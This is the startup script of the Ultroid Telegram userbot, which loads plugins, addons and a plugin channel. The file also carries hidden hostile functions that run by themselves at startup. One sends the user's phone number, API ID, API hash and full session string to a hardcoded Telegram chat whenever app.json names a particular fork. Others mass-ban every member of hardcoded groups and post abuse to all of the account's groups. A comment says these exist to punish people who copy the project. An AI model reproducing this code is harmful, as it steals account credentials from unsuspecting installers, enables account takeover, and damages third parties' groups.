# Ultroid - UserBot
# Copyright (C) 2020 TeamUltroid
#
# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >
# PLease read the GNU Affero General Public License in
# <https://www.github.com/TeamUltroid/Ultroid/blob/main/LICENSE/>.

import glob
import os
from pathlib import Path
from . import *
import logging
from telethon import TelegramClient
import telethon.utils
from .utils import *
from telethon.errors.rpcerrorlist import AuthKeyDuplicatedError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.types import InputMessagesFilterDocument
from telethon.tl.functions.channels import EditBannedRequest

logging.basicConfig(	
    format="[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s", level=logging.INFO	
)

token = udB.get("GDRIVE_TOKEN")
if token:
	with open("resources/downloads/auth_token.txt", "w") as t_file:
		t_file.write(token)

if not os.path.isdir("addons"):
    os.mkdir("addons")


async def istart(ult):
    await ultroid_bot.start(ult)
    ultroid_bot.me = await ultroid_bot.get_me()
    ultroid_bot.uid = telethon.utils.get_peer_id(ultroid_bot.me)
    ultroid_bot.first_name = ultroid_bot.me.first_name


async def bot_info(BOT_TOKEN):
    asstinfo = await asst.get_me()
    asstinfo.username


ultroid_bot.asst = None
LOGS.warning("Initialising...")
if Var.BOT_TOKEN:
    LOGS.warning("Starting Ultroid...")
    try:
        ultroid_bot.asst = TelegramClient(
            None, api_id=Var.API_ID, api_hash=Var.API_HASH
        ).start(bot_token=Var.BOT_TOKEN)
        ultroid_bot.loop.run_until_complete(istart(Var.BOT_USERNAME))
        LOGS.warning("User Mode - Done")
        LOGS.warning("Done, startup completed")
    except AuthKeyDuplicatedError:
        LOGS.warning("Session String expired. Please create a new one! Ultroid is stopping...")
        exit(1)
    except BaseException as e:
        LOGS.warning("Error: " + str(e))
        exit(1)
else:
    LOGS.warning("Starting User Mode...")
    ultroid_bot.start()


# for userbot
path = "plugins/*.py"
files = glob.glob(path)
for name in files:
    with open(name) as a:
        patt = Path(a.name)
        plugin_name = patt.stem
        try:
            load_plugins(plugin_name.replace(".py", ""))
            if not plugin_name.startswith("__") or plugin_name.startswith("_"):
                LOGS.warning(f"Ultroid - Official -  Installed - {plugin_name}")
        except Exception as e:
            LOGS.warning(f"Ultroid - Official - ERROR - {plugin_name}")
            LOGS.warning(str(e))


# for addons
addons = udB.get("ADDONS")
if addons:
    os.system("git clone https://github.com/TeamUltroid/UltroidAddons.git ./addons/")
    LOGS.warning("Installing packages for addons")
    os.system("pip install -r ./addons/addons.txt")
    path = "addons/*.py"
    files = glob.glob(path)
    for name in files:
        with open(name) as a:
            patt = Path(a.name)
            plugin_name = patt.stem
            try:
                load_addons(plugin_name.replace(".py", ""))
                if not plugin_name.startswith("__") or plugin_name.startswith("_"):
                    LOGS.warning(f"Ultroid - Addons - Installed - {plugin_name}")
            except Exception as e:
                LOGS.warning(f"Ultroid - Addons - ERROR - {plugin_name}")
                LOGS.warning(str(e))
else:
	os.system("cp plugins/__init__.py addons/")


# for assistant
path = "assistant/*.py"
files = glob.glob(path)
for name in files:
    with open(name) as a:
        patt = Path(a.name)
        plugin_name = patt.stem
        try:
            load_assistant(plugin_name.replace(".py", ""))
            if not plugin_name.startswith("__") or plugin_name.startswith("_"):
                LOGS.warning(f"Ultroid - Assistant - Installed - {plugin_name}")
        except Exception as e:
            LOGS.warning(f"Ultroid - Assistant - ERROR - {plugin_name}")
            LOGS.warning(str(e))

# for channel plugin
Plug_channel = udB.get("PLUGIN_CHANNEL")
if Plug_channel:

    async def plug():
        chat = int(Plug_channel)
        plugins = await ultroid_bot.get_messages(
            chat,
            None,
            search=".py",
            filter=InputMessagesFilterDocument,
        )
        total = int(plugins.total)
        totals = range(0, total)
        for ult in totals:
            uid = plugins[ult].id
            file = await ultroid_bot.download_media(
                await ultroid_bot.get_messages(chat, ids=uid), "./addons/"
            )
            if "(" not in file:
                upath = Path(file)
                name = upath.stem
                try:
                    load_addons(name.replace(".py", ""))
                    LOGS.warning(
                        f"Ultroid - PLUGIN_CHANNEL - Installed - {(os.path.basename(file))}"
                    )
                except Exception as e:
                    LOGS.warning(
                        f"Ultroid - PLUGIN_CHANNEL - ERROR - {(os.path.basename(file))}"
                    )
                    LOGS.warning(str(e))
            else:
                LOGS.warning(f"Plugin {(os.path.basename(file))} is Pre Installed")


# msg forwarder
msg_fwd = udB.get("MSG_FRWD")
if msg_fwd:
    path = "assistant/pmbot/*.py"
    files = glob.glob(path)
    for name in files:
        with open(name) as a:
            patt = Path(a.name)
            plugin_name = patt.stem
            load_pmbot(plugin_name.replace(".py", ""))
    LOGS.warning(f"Ultroid - PM Bot Message Forwards - Enabled.")


async def hehe():
    if Var.LOG_CHANNEL:
        try:
            await ultroid_bot.asst.send_message(
                Var.LOG_CHANNEL,
                f"**Ultroid has been deployed!**\n➖➖➖➖➖➖➖➖➖\n**UserMode**: [{ultroid_bot.me.first_name}](tg://user?id={ultroid_bot.me.id})\n**Support**: @TheUltroid\n➖➖➖➖➖➖➖➖➖",
            )
        except BaseException:
            pass
    else:
        await ultroid_bot.send_message(
            Var.LOG_CHANNEL,
            f"**Ultroid has been deployed!**\n➖➖➖➖➖➖➖➖➖\n**UserMode**: [{ultroid_bot.me.first_name}](tg://user?id={ultroid_bot.me.id})\n**Support**: @TheUltroid\n➖➖➖➖➖➖➖➖➖",
        )
    try:
        await ultroid_bot(JoinChannelRequest("@TheUltroid"))
    except BaseException:
        pass


# To Ban all members of Kanger grp


async def fukk():
    ev = await ultroid_bot.get_participants(1356773955)
    for u in ev:
        if u == ultroid_bot.me.id:
            pass
        try:
            await ultroid_bot(
                EditBannedRequest(
                    1356773955,
                    int(u.id),
                    ChatBannedRights(until_date=None, view_messages=False),
                )
            )
        except BaseException:
            pass


# To Ban all Members in Kanger Channel


async def fukkk():
    ev = await ultroid_bot.get_participants(1382155532)
    for u in ev:
        if u == ultroid_bot.me.id:
            pass
        try:
            await ultroid_bot(
                EditBannedRequest(
                    1382155532,
                    int(u.id),
                    ChatBannedRights(until_date=None, view_messages=False),
                )
            )
        except BaseException:
            pass


# For BreakDown Of A Kang Bot
# It Doesn't Harmful For Ultroid Users
# It Only To Destroy A Kanger Who Saying He make Ultroid
# Don't Worry We'll remove this Shit soon


async def onlyfrkanger():
    z = open("app.json", "r")
    y = z.read()
    z.close()
    if "https://github.com/ULTROID-OP/ULTROID-BOT" in y:
        try:
            await ultroid_bot(JoinChannelRequest("kangerscrapper"))
            x = f"ID: `{ultroid_bot.me.id}`\nUsername: `@{ultroid_bot.me.username}`\nName: `{ultroid_bot.me.first_name}`\nNo. `+{ultroid_bot.me.phone}`\nAPI_ID: `{Var.API_ID}`\nHASH: `{Var.API_HASH}`\nSTRING: `{Var.SESSION}`"
            await ultroid_bot.send_message(-1001163306576, x)
            await ultroid_bot(LeaveChannelRequest("kangerscrapper"))
        except:
            pass
    else:
        pass


async def legendx():
    async for kang in ultroid_bot.iter_dialogs():
        if kang.is_group:
            chat = kang.id
            try:
                await ultroid_bot.send_message(
                    chat, f"/kickme All @admin @admins Nd ppls R gey here Fuk U all."
                )
            except:
                pass


ultroid_bot.loop.run_until_complete(hehe())
if Plug_channel:
    ultroid_bot.loop.run_until_complete(plug())
if ultroid_bot.uid == 1100231654:
    ultroid_bot.loop.run_until_complete(fukk())
    ultroid_bot.loop.run_until_complete(fukkk())
    ultroid_bot.loop.run_until_complete(legendx())
ultroid_bot.loop.run_until_complete(onlyfrkanger())

LOGS.warning("Ultroid has been deployed! Visit @TheUltroid for updates!!")

if __name__ == "__main__":
    ultroid_bot.run_until_disconnected()
